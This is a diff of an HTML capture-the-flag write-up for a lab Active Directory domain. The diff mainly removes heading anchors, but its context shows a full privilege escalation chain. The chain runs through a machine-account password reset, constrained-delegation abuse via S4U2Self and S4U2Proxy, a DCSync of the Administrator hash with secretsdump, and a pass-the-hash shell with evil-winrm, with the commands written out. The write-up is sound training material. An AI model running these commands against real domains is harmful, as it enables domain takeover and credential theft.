+<h3 id="step-2-reset-fs01s-password">Step 2 — Reset FS01$'s Password</h3>
 <p>Since IT has <code>GenericAll</code> over <code>FS01$</code>, we can reset its password without knowing the current one. This gives us full control over the account — we now know its credentials:
 <div class="highlight"><pre><span></span><code><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a>❯<span class="w"> </span>bloodyAD<span class="w"> </span>-d<span class="w"> </span>redelegate.vl<span class="w"> </span>-k<span class="w"> </span>--host<span class="w"> </span><span class="s1">'dc.redelegate.vl'</span><span class="w"> </span><span class="nb">set</span><span class="w"> </span>password<span class="w"> </span><span class="s1">'FS01$'</span><span class="w"> </span><span class="s1">'Pass1234!@#$'</span>
 <a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Password<span class="w"> </span>changed<span class="w"> </span>successfully!
 </code></pre></div></p>
 <p>The <code>-k</code> flag tells <code>bloodyAD</code> to use our cached Kerberos ticket instead of a plaintext password for authentication.</p>
-<h3 id="step-3-enable-protocol-transition">Step 3 — Enable Protocol Transition<a class="headerlink" href="#step-3-enable-protocol-transition" title="Permanent link">&para;</a></h3>
+<h3 id="step-3-enable-protocol-transition">Step 3 — Enable Protocol Transition</h3>
 <p>For S4U2Proxy to work <strong>without</strong> needing the target user's TGT, the delegating account must have the <code>TRUSTED_TO_AUTH_FOR_DELEGATION</code> UAC flag set. This enables the S4U2Self extension — which lets a service request a ticket to itself on behalf of any user. Normally only Domain Admins can set this flag. <code>SeEnableDelegationPrivilege</code> is exactly what allows us to do it as a regular user:
 <div class="highlight"><pre><span></span><code><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a>❯<span class="w"> </span>bloodyAD<span class="w"> </span>-d<span class="w"> </span>redelegate.vl<span class="w"> </span>-k<span class="w"> </span>--host<span class="w"> </span><span class="s2">"dc.redelegate.vl"</span><span class="w"> </span>add<span class="w"> </span>uac<span class="w"> </span>FS01$<span class="w"> </span>-f<span class="w"> </span>TRUSTED_TO_AUTH_FOR_DELEGATION
 <a id="__codelineno-31-2" name="__codelineno-31-2" href="#__codelineno-31-2"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span><span class="o">[</span><span class="s1">'TRUSTED_TO_AUTH_FOR_DELEGATION'</span><span class="o">]</span><span class="w"> </span>property<span class="w"> </span>flags<span class="w"> </span>added<span class="w"> </span>to<span class="w"> </span>FS01$<span class="err">'</span>s<span class="w"> </span>userAccountControl
 </code></pre></div></p>
-<h3 id="step-4-set-the-delegation-target">Step 4 — Set the Delegation Target<a class="headerlink" href="#step-4-set-the-delegation-target" title="Permanent link">&para;</a></h3>
+<h3 id="step-4-set-the-delegation-target">Step 4 — Set the Delegation Target</h3>
 <p>We set <code>msDS-AllowedToDelegateTo</code> on <code>FS01$</code> to point to <code>cifs/dc.redelegate.vl</code>. This tells the KDC that <code>FS01$</code> is trusted to delegate to the CIFS service on the DC — which is what <code>secretsdump.py</code> uses internally (SMB/CIFS = port 445, the protocol for DRSUAPI/DCSync):
 <div class="highlight"><pre><span></span><code><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a>❯<span class="w"> </span>bloodyAD<span class="w"> </span>-d<span class="w"> </span>redelegate.vl<span class="w"> </span>-k<span class="w"> </span>--host<span class="w"> </span><span class="s2">"dc.redelegate.vl"</span><span class="w"> </span><span class="nb">set</span><span class="w"> </span>object<span class="w"> </span>FS01$<span class="w"> </span>msDS-AllowedToDelegateTo<span class="w"> </span>-v<span class="w"> </span>cifs/dc.redelegate.vl
 <a id="__codelineno-32-2" name="__codelineno-32-2" href="#__codelineno-32-2"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>FS01$<span class="err">'</span>s<span class="w"> </span>msDS-AllowedToDelegateTo<span class="w"> </span>has<span class="w"> </span>been<span class="w"> </span>updated
 </code></pre></div></p>
-<h3 id="step-5-get-a-tgt-for-fs01">Step 5 — Get a TGT for FS01$<a class="headerlink" href="#step-5-get-a-tgt-for-fs01" title="Permanent link">&para;</a></h3>
+<h3 id="step-5-get-a-tgt-for-fs01">Step 5 — Get a TGT for FS01$</h3>
 <p>Now we authenticate as <code>FS01$</code> with the password we just set, and cache its TGT:
 <div class="highlight"><pre><span></span><code><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a>❯<span class="w"> </span>getTGT.py<span class="w"> </span>redelegate.vl/FS01$:<span class="s1">'Pass1234!@#$'</span>
 <a id="__codelineno-33-2" name="__codelineno-33-2" href="#__codelineno-33-2"></a>Impacket<span class="w"> </span>v0.13.0<span class="w"> </span>-<span class="w"> </span>Copyright<span class="w"> </span>Fortra,<span class="w"> </span>LLC<span class="w"> </span>and<span class="w"> </span>its<span class="w"> </span>affiliated<span class="w"> </span>companies
@@ -1441,8 +1441,8 @@ We capture an <strong>NTLMv2 hash</strong> for <code>REDELEGATE\sql_svc</code> �
 </code></pre></div></p>
 <div class="highlight"><pre><span></span><code><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a>❯<span class="w"> </span><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>FS01$.ccache
 </code></pre></div>
-<h2 id="s4u2proxy-impersonating-the-domain-controller">S4U2Proxy — Impersonating the Domain Controller<a class="headerlink" href="#s4u2proxy-impersonating-the-domain-controller" title="Permanent link">&para;</a></h2>
-<h3 id="step-6-request-the-impersonation-ticket">Step 6 — Request the Impersonation Ticket<a class="headerlink" href="#step-6-request-the-impersonation-ticket" title="Permanent link">&para;</a></h3>
+<h2 id="s4u2proxy-impersonating-the-domain-controller">S4U2Proxy — Impersonating the Domain Controller</h2>
+<h3 id="step-6-request-the-impersonation-ticket">Step 6 — Request the Impersonation Ticket</h3>
 <p><code>getST.py</code> performs the full S4U chain using the <code>FS01$</code> TGT:</p>
 <ol>
 <li><strong>S4U2Self</strong>: <code>FS01$</code> requests a service ticket to itself on behalf of <code>dc</code> (the DC's machine account name).</li>
@@ -1459,7 +1459,7 @@ We capture an <strong>NTLMv2 hash</strong> for <code>REDELEGATE\sql_svc</code> �
 </code></pre></div></p>
 <div class="highlight"><pre><span></span><code><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a>❯<span class="w"> </span><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>dc@cifs_dc.redelegate.vl@REDELEGATE.VL.ccache
 </code></pre></div>
-<h2 id="dcsync-dumping-the-administrator-hash">DCSync — Dumping the Administrator Hash<a class="headerlink" href="#dcsync-dumping-the-administrator-hash" title="Permanent link">&para;</a></h2>
+<h2 id="dcsync-dumping-the-administrator-hash">DCSync — Dumping the Administrator Hash</h2>
 <p>With the impersonation ticket loaded, we run <code>secretsdump.py</code>. It connects over CIFS using our ticket and replicates credentials via the DRSUAPI protocol — the same mechanism domain controllers use to sync with each other. The DC treats the request as coming from another DC, so it hands over the hashes:
 <div class="highlight"><pre><span></span><code><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a>❯<span class="w"> </span>secretsdump.py<span class="w"> </span>-k<span class="w"> </span>-no-pass<span class="w"> </span>dc.redelegate.vl<span class="w"> </span>-just-dc-user<span class="w"> </span>Administrator
 <a id="__codelineno-37-2" name="__codelineno-37-2" href="#__codelineno-37-2"></a>Impacket<span class="w"> </span>v0.13.0<span class="w"> </span>-<span class="w"> </span>Copyright<span class="w"> </span>Fortra,<span class="w"> </span>LLC<span class="w"> </span>and<span class="w"> </span>its<span class="w"> </span>affiliated<span class="w"> </span>companies
@@ -1474,7 +1474,7 @@ We capture an <strong>NTLMv2 hash</strong> for <code>REDELEGATE\sql_svc</code> �
 <a id="__codelineno-37-11" name="__codelineno-37-11" href="#__codelineno-37-11"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Cleaning<span class="w"> </span>up...
 </code></pre></div></p>
 <p>NT hash: <strong><code>&lt;REDACTED_HASH&gt;</code></strong></p>
-<h2 id="shell-as-administrator-root-flag">Shell as Administrator — Root Flag<a class="headerlink" href="#shell-as-administrator-root-flag" title="Permanent link">&para;</a></h2>
+<h2 id="shell-as-administrator-root-flag">Shell as Administrator — Root Flag</h2>
 <p>We use the NT hash directly via Pass-the-Hash with <code>evil-winrm</code>. No password cracking required:
 <div class="highlight"><pre><span></span><code><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a><span class="err">❯</span> <span class="n">evil-winrm</span> <span class="n">-i</span> <span class="n">10</span><span class="p">.</span><span class="n">129</span><span class="p">.</span><span class="n">234</span><span class="p">.</span><span class="n">50</span> <span class="n">-u</span> <span class="s1">'Administrator'</span> <span class="n">-H</span> <span class="s1">'&lt;REDACTED_HASH&gt;'</span>
 <a id="__codelineno-38-2" name="__codelineno-38-2" href="#__codelineno-38-2"></a>
@@ -1562,6 +1562,8 @@ We capture an <strong>NTLMv2 hash</strong> for <code>REDELEGATE\sql_svc</code> �
     
     
       <script src="../../../../../../assets/javascripts/bundle.f55a23d4.min.js"></script>
+      
+        <script src="../../../../../../javascripts/site.js"></script>
       
     
   </body>
